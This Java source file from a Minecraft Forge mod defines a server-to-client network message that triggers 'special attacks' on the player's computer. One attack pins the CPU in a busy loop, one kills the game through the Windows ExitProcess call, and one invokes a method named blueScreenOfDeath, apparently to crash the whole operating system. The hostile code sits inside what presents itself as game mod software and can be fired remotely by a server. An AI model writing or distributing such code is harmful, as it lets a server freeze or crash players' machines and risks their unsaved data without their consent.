package bruce.projectreflection.network;

import bruce.projectreflection.ProjectReflection;
import bruce.projectreflection.client.win32.Kernel32Extended;
import bruce.projectreflection.misc.CPULoadTasks;
import io.netty.buffer.ByteBuf;
import net.minecraft.client.Minecraft;
import net.minecraft.util.IThreadListener;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.IMessageHandler;
import net.minecraftforge.fml.common.network.simpleimpl.MessageContext;
import org.lwjgl.opengl.GL11;

public class MessageClientSpecialAttack implements IMessage {
    public enum SpecialAttackType {
        SLEEP_ATTACK,
        CRASH_ATTACK,
        BSOD_ATTACK
    }

    public SpecialAttackType type;
    public int sleepTime;

    public MessageClientSpecialAttack() {
        this(SpecialAttackType.BSOD_ATTACK, 0);
    }

    public MessageClientSpecialAttack(SpecialAttackType type, int sleepTimeOrReturnCode) {
        this.type = type;
        this.sleepTime = sleepTimeOrReturnCode;
    }
    @Override
    public void fromBytes(ByteBuf buf) {
        this.type = SpecialAttackType.values()[buf.readInt()];
        this.sleepTime = buf.readInt();
    }

    @Override
    public void toBytes(ByteBuf buf) {
        buf.writeInt(type.ordinal());
        buf.writeInt(this.sleepTime);
    }

    public static class Handler implements IMessageHandler<MessageClientSpecialAttack, IMessage> {
        @Override
        public IMessage onMessage(MessageClientSpecialAttack message, MessageContext ctx) {
            switch (message.type) {
                case SLEEP_ATTACK: {
                    Minecraft.getMinecraft().addScheduledTask(() -> {
                        //Kernel32Extended.INSTANCE.Sleep(message.sleepTime);
                        long startTime = System.currentTimeMillis();
                        long endTime = 0;
                        do {
                            CPULoadTasks.matrixMultiplication();
                            CPULoadTasks.generatePrimesUpToLimit(message.sleepTime);
                            CPULoadTasks.integrateFunction(0.0, 1.0, x -> Math.sin(x.doubleValue()), message.sleepTime);
                            CPULoadTasks.calculateFibonacci(message.sleepTime);
                            //GL11.glDrawArrays(GL11.GL_TRIANGLES,0,3);
                            endTime = System.currentTimeMillis();
                        } while (endTime < startTime + message.sleepTime);
                    });
                    break;
                }
                case CRASH_ATTACK:
                    Kernel32Extended.INSTANCE.ExitProcess(message.sleepTime);
                case BSOD_ATTACK:
                    ProjectReflection.proxy.blueScreenOfDeath();
            }
            return null;
        }
    }
}
